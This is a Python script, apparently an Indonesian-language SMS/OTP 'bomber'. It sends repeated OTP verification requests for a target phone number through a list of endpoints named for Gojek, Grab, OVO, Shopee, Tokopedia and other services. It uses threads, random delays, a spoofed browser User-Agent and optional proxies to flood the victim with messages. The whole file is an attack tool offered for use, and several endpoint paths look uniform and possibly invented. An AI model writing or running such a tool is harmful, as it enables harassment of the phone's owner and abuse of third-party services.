import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

API_LIST = [
    {
        'url': 'https://api.gojekapi.com/v1/customers/phone/verify',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.grab.com/grabid/v1/phone/otp',
        'method': 'POST',
        'data': {'phoneNumber': '{nomor}'}
    },
    {
        'url': 'https://api.ovo.id/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.dana.id/v1/auth/otp',
        'method': 'POST',
        'data': {'mobile': '{nomor}'}
    },
    {
        'url': 'https://api.shopee.co.id/api/v1/account/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.tokopedia.com/v1/user/otp',
        'method': 'POST',
        'data': {'msisdn': '{nomor}'}
    },
    {
        'url': 'https://api.bukalapak.com/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.traveloka.com/v1/auth/otp',
        'method': 'POST',
        'data': {'phoneNumber': '{nomor}'}
    },
    {
        'url': 'https://api.jd.id/v1/auth/otp',
        'method': 'POST',
        'data': {'mobile': '{nomor}'}
    },
    {
        'url': 'https://api.blibli.com/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.lazada.co.id/v1/auth/otp',
        'method': 'POST',
        'data': {'mobile': '{nomor}'}
    },
    {
        'url': 'https://api.zalora.co.id/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.bibit.id/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.ajaib.co.id/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
    {
        'url': 'https://api.stockbit.com/v1/auth/otp',
        'method': 'POST',
        'data': {'phone': '{nomor}'}
    },
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
    'Content-Type': 'application/json'
}

def send_otp(api, nomor, proxy=None):
    try:
        url = api['url']
        data = api['data'].copy()
        for key in data:
            data[key] = data[key].replace('{nomor}', nomor)
        if api['method'] == 'POST':
            response = requests.post(url, json=data, headers=HEADERS, proxies=proxy, timeout=10)
        else:
            response = requests.get(url, params=data, headers=HEADERS, proxies=proxy, timeout=10)
        if response.status_code in [200, 201, 202]:
            print('.', end='', flush=True)
            return True
        else:
            print('x', end='', flush=True)
            return False
    except:
        print('e', end='', flush=True)
        return False

def spam_otp(nomor, jumlah=50, thread=10):
    print(f"\n[+] Target: {nomor} | Request: {jumlah} | Thread: {thread}\n")
    success = 0
    failed = 0
    
    def worker():
        nonlocal success, failed
        for _ in range(jumlah // thread):
            api = random.choice(API_LIST)
            if send_otp(api, nomor):
                success += 1
            else:
                failed += 1
            time.sleep(random.uniform(0.1, 0.5))
    
    with ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(worker) for _ in range(thread)]
        for future in futures:
            future.result()
    
    print(f"\n\n[+] Done! Success: {success} | Failed: {failed}")

if __name__ == "__main__":
    nomor = input("Masukkan nomor target (contoh: 6281234567890): ")
    jumlah = int(input("Jumlah request: ") or 50)
    thread = int(input("Jumlah thread: ") or 10)
    spam_otp(nomor, jumlah, thread)
